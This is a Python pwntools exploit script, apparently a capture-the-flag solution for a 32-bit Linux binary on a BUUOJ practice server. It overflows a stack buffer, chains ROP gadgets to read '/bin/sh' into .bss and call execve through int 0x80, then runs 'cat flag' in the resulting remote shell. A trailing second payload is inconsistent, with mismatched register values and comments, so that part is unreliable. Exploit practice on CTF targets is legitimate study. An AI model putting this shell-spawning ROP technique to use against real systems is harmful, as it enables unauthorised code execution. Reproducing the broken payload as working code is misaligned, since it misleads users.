#!/usr/bin/python2
#coding=utf-8
from pwn import *
from LibcSearcher import *

context(os = "linux", arch = "i386", log_level= "debug")
sh = remote("node4.buuoj.cn", 27987)

read_addr = 0x0806cd50
int_80 = 0x080493e1
pop_eax_ret = 0x080bae06
pop_edx_ecx_eax_ret = 0x0806e850
bss_addr = 0x080EB13D

offest = 0x14
payload =  b'a' * offest +  b'a' * 4 
# payload +=  p32(read_addr)
payload += p32(pop_edx_ecx_eax_ret)			# 平衡栈空间
payload += p32(0) + p32(bss_addr) + p32(8)	# read函数的三个参数 
payload += p32(pop_eax_ret) + p32(0x0b)		# 对eax进行赋值
# 对edx、ecx、ebx进行赋值
payload += p32(pop_edx_ecx_eax_ret) + p32(0) + p32(0) + p32(bss_addr)
payload += p32(int_80)

sh.sendlineafter(b":", payload)
sh.sendline("/bin/sh\x00")
sh.sendline("cat flag")

sh.interactive()





#0x080bae06 : pop eax ; ret     11  
#0x080481c9 : pop ebx ; ret     "\bin\sh"
#0x0806e851 : pop ecx ; pop ebx ; ret   0  "\bin\sh"
#0x0806e82a : pop edx ; ret   0

pop_eax = 0x080bae06
pop_ebx =0x080481c9
pop_ecx_ebx = 0x0806e851
pop_edx =0x0806e82a



offest = 0x14
payload =  b'a' * offest +  b'a' * 4 
payload += p32(pop_eax)	+ p32(11)		# 平衡栈空间
payload += p32(pop_ebx) + p32(8)	# read函数的三个参数 
payload += p32(pop_eax_ret) + p32(0x0b)		# 对eax进行赋值
payload += p32(pop_edx_ecx_eax_ret) + p32(0) + p32(0) + p32(bss_addr)
payload += p32(int_80)

# read(0,add,0)
# execve(addr,0,0)
#系统调用号的 32
# ```
# 设置系统调用参数即可执行`execve("\bin\sh",0,0)`，获取shell  
# 四个参数分别是`eax`、`ebx`、`ecx`、`edx`
# ```

# int 0x80  32位的系统调用号触发指令  0x080493e1 : int 0x80
# execute 函数
# syscall   64位的系统调用号触发指令